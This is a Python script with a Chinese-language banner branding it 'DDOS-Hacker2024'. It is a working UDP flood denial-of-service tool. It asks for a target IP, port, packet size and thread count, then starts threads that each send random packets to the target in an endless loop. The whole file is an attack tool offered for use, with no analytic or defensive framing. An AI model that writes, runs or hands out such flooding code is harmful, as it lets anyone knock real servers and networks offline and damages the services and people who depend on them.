import socket  
import os  
import threading  
import time  
  
print(r"""

___  ____   ___  ____         __  __           __            ____   ___ ____  _  _   
|  _ \|  _ \ / _ \/ ___|      | | | | __ _  ___| | _____ _ _|___ \ / _ \___ \| || |  
| | | | | | | | | \___ \ _____| |_| |/ _` |/ __| |/ / _ \ '__|__) | | | |__) | || |_ 
| |_| | |_| | |_| |___) |_____|  _  | (_| | (__|   <  __/ |  / __/| |_| / __/|__   _|
|____/|____/ \___/|____/      |_| |_|\__,_|\___|_|\_\___|_| |_____|\___/_____|  |_|  
                                                                                     

官方网站：https://www.0daysec.net/

项目地址：https://github.com/GXlinyihua/DDOS-Hacker2024

开发人员：林易华 v 樱花泪

电子邮箱：ihonker08@163.com

————————————————————
""")


# 创建UDP套接字  
def create_socket(target_ip, target_port):  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    sock.settimeout(1)  # 设置超时时间，防止套接字阻塞  
    return sock  
  
# UDP洪水攻击函数  
def udp_flood(sock, target_ip, target_port, data_size):  
    random_data = os.urandom(data_size)  # 生成指定大小的随机数据  
    while True:  
        try:  
            sock.sendto(random_data, (target_ip, target_port))  
            print(f"已向 {target_ip}:{target_port} 发送数据包")  
        except socket.error as e:  
            print(f"套接字错误：{e}")  
            break  
        time.sleep(0.01)  # 添加一些延迟  
  
# 主函数  
def main():  
    target_ip = input("目标IP：")  
    target_port = int(input("端口号："))  
    data_size = int(input("数据包字节大小："))  # 用户输入数据包字节大小  
    num_threads = int(input("线程数："))  # 用户输入线程数  
  
    sockets = []  
    threads = []  
  
    # 创建多个套接字和线程  
    for i in range(num_threads):  
        sock = create_socket(target_ip, target_port)  
        sockets.append(sock)  
        t = threading.Thread(target=udp_flood, args=(sock, target_ip, target_port, data_size))  
        threads.append(t)  
        t.start()  
  
    # 等待所有线程完成（实际中，可能不需要等待，因为攻击是持续的）  
    for t in threads:  
        t.join()  
  
    # 关闭所有套接字  
    for sock in sockets:  
        sock.close()  
  
if __name__ == "__main__":  
    main()
